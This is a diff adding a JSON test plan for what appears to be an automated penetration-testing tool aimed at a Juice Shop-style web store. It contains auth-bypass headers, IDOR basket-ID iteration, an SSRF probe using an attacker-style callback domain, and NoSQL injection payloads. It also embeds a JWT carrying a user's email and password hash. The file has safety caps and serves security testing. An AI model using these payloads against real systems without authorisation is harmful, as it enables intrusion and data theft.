@@ -1,0 +1,477 @@
+{
+  "test_cases": [
+    {
+      "id": "tc-hv-001-1",
+      "hypothesis_id": "hv-001",
+      "base_url": "http://{host}",
+      "method": "GET",
+      "endpoint": "/rest/user/whoami",
+      "parameter": "authorization",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ],
+          "description": "Baseline valid bearer token request to capture status and body length.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: Bearer invalid.token.for.testing"
+            }
+          ],
+          "description": "Probe with invalid/garbled bearer token to observe status and error messages.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: "
+            },
+            {
+              "location": "header",
+              "value": "authorization: Bearer "
+            },
+            {
+              "location": "header",
+              "value": "authorization: Bearer null"
+            }
+          ],
+          "description": "Attempts with missing/empty/placeholder Authorization header to detect auth bypass behavior.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Valid bearer token already observed in context; use as-is.",
+          "bind_to": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_status_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "body_length_delta_pct >= 30",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "numeric_value": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "response_body_contains(token, authentication, invalid, malformed, expired)",
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Execute benign then probes. Compare status and body length to baseline. Use observed bearer token for authenticated requests.",
+      "tags": [
+        "authn_bypass",
+        "bearer_token"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-002-1",
+      "hypothesis_id": "hv-002",
+      "base_url": "http://{host}",
+      "method": "GET",
+      "endpoint": "/rest/basket/{basketId}",
+      "parameter": "basketId",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/rest/basket/6"
+            }
+          ],
+          "description": "Baseline request to own basketId=6 (authenticated non-owner context uses provided token).",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/rest/basket/7"
+            }
+          ],
+          "description": "Probe using adjacent basketId=7 (non-owned) to detect access differences.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "/rest/basket/1"
+            },
+            {
+              "location": "path",
+              "value": "/rest/basket/10"
+            }
+          ],
+          "description": "Iterate over other candidate basketIds to detect IDOR; use non-owner authenticated token. Stop if access returns 200 and body significantly different from baseline.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Use authenticated non-owner token in Authorization header.",
+          "bind_to": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "baseline_status != probe_status or probe_status in [200,403,404]",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) * 100 >= 40",
+          "threshold": {
+            "body_length_delta_pct": 40.0,
+            "numeric_value": 40.0
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 3,
+      "delay_between_requests": 0.5,
+      "notes": "Send baseline to basketId 6 then probe other IDs. Compare status and body size. Stop if success observed for non-owner.",
+      "tags": [
+        "idor",
+        "basket"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "tc-hv-003-1",
+      "hypothesis_id": "hv-003",
+      "base_url": "http://{host}",
+      "method": "GET",
+      "endpoint": "/rest/admin/application-configuration",
+      "parameter": "authorization",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ],
+          "description": "Baseline with non-admin token to observe denial (expected 401/403).",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: Bearer invalid.token.for.admin.test"
+            }
+          ],
+          "description": "Probe with invalid token to observe error or fallback behavior.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "header",
+              "value": "authorization: "
+            },
+            {
+              "location": "header",
+              "value": "authorization: Bearer null"
+            }
+          ],
+          "description": "Missing or empty authorization to see if endpoint leaks configuration without proper admin check.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Provide authenticated non-admin token in Authorization header as precondition.",
+          "bind_to": "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "baseline_status != probe_status or probe_status == 200",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) * 100 >= 30",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "numeric_value": 30.0
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Do not iterate aggressively. Capture baseline denial and probe missing/invalid auth to detect admin bypass.",
+      "tags": [
+        "authz_bypass",
+        "admin"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-004-1",
+      "hypothesis_id": "hv-004",
+      "base_url": "http://{host}",
+      "method": "GET",
+      "endpoint": "/socket.io/",
+      "parameter": "sid",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "?sid=static-test"
+            }
+          ],
+          "description": "Baseline fetch with safe sid value to observe normal behavior.",
+          "encoding": "utf-8",
+          "content_type": "*/*",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "?sid=example.com.xb.*.attacker-ctf.net"
+            }
+          ],
+          "description": "Probe with attacker-controlled domain-looking sid to attempt SSRF/OOB trigger. Use single request due to safety.",
+          "encoding": "utf-8",
+          "content_type": "*/*",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "OOB domain configured to detect DNS/HTTP callbacks; external monitoring must be enabled by operator before running.",
+          "custom_logic": "use operator-provided OOB domain in query value"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "dns_callback",
+          "condition": "oob_dns_seen_for_subdomain",
+          "weight": 1.0
+        },
+        {
+          "signal": "http_callback",
+          "condition": "oob_http_seen_for_path",
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 1
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "Requires external OOB collaborator. Do not perform if OOB endpoint unavailable. Only one probe allowed.",
+      "tags": [
+        "ssrf",
+        "socket.io"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "tc-hv-005-1",
+      "hypothesis_id": "hv-005",
+      "base_url": "http://{host}",
+      "method": "GET",
+      "endpoint": "/rest/products/search",
+      "parameter": "name",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"name\":\"test-product\"}"
+            }
+          ],
+          "description": "Baseline safe search body.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"name\":\"{\"$ne\":null}"
+            }
+          ],
+          "description": "Probe with common NoSQL operator-like payload to elicit parse errors or altered results.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"name\":{\"$regex\":\".*\"}}"
+            },
+            {
+              "location": "body",
+              "value": "{\"name\":{\"$ne\":\"nonexistent\"}}"
+            }
+          ],
+          "description": "Further NoSQL-style inputs to attempt result manipulation if server deserializes JSON into query operators.",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No auth required; ensure benign search returns consistent baseline for comparison."
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "response_body_matches(/Mongo|syntax error|Query failed|Invalid query|E1100|Cast to ObjectId failed/i)",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "abs(body_len_probe - body_len_baseline)/max(1,body_len_baseline) *100 >= 40",
+          "threshold": {
+            "body_length_delta_pct": 40.0,
+            "numeric_value": 40.0
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 8
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Send benign JSON body then NoSQL operator-like payloads. Compare body lengths and look for DB error signatures.",
+      "tags": [
+        "nosql_injection",
+        "search"
+      ],
+      "estimated_duration": 120
+    }
+  ]
+}
